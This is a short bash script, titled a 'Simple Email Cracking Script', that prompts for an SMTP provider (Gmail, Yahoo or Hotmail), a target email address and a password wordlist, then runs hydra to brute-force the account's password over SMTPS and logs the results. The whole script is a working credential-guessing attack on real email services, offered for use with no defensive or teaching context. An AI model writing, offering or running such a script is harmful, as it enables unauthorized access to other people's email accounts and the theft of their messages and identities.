#!/bin/bash

red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`

echo "${green}Simple Email Cracking Script.${reset}"
echo "${green}NOTE: Make sure you have wordlists!${reset}"
echo "${green}Let us Begin:${reset}"
echo "${green}Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:${reset}"
read smtp
echo "${green}Enter Email Address:${reset}"
read email
echo "${green}Provide Directory of Wordlist for Passwords:${reset}"
read wordlist

# Check if the specified SMTP service is valid
if [ "$smtp" != "smtp.gmail.com" ] && [ "$smtp" != "smtp.mail.yahoo.com" ] && [ "$smtp" != "smtp.live.com" ]; then
  echo "${red}Invalid SMTP service. Exiting...${reset}"
  exit 1
fi

# Check if the specified email address is valid
if ! echo "$email" | grep -q "@"; then
  echo "${red}Invalid email address. Exiting...${reset}"
  exit 1
fi

# Check if the specified wordlist file exists
if [ ! -f "$wordlist" ]; then
  echo "${red}Wordlist file does not exist. Exiting...${reset}"
  exit 1
fi

# Save the results to a text file
hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp | tee -a email-crack-results.txt

echo "${green}Cracking completed. Results saved to emailcrack-results.txt${reset}"
